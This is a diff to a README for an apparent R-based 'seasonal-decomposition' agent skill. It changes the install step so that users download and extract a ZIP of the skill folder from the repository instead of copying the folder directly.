@@ -4,7 +4,7 @@
 
 ## Setup and Quick Start
 
-1. Put the `seasonal-decomposition/` folder in your agent's skills directory, keeping `SKILL.md` and `references/` together.
+1.  Download [seasonal-decomposition.zip](https://github.com/albertbryantk/seasonal-decomposition/raw/refs/heads/main/seasonal-decomposition.zip) from this repository. Extract the ZIP, then put the extracted `seasonal-decomposition/` folder in your agent's skills directory. Keep `SKILL.md` and `references/` together inside that folder.
 2. Make R available to the agent. Run `Rscript --version` to check. On Windows, you can use the full path to `Rscript.exe` in your R installation's `bin` folder. Classical decomposition and STL use base R. The other methods' dependencies are listed below.
 3. Attach a dataset or name a built-in R series, then ask the agent to use `seasonal-decomposition`. Include your question if you have one. For example, “Use `seasonal-decomposition` to find which months typically have the highest sales and whether the underlying sales level is rising.”
 
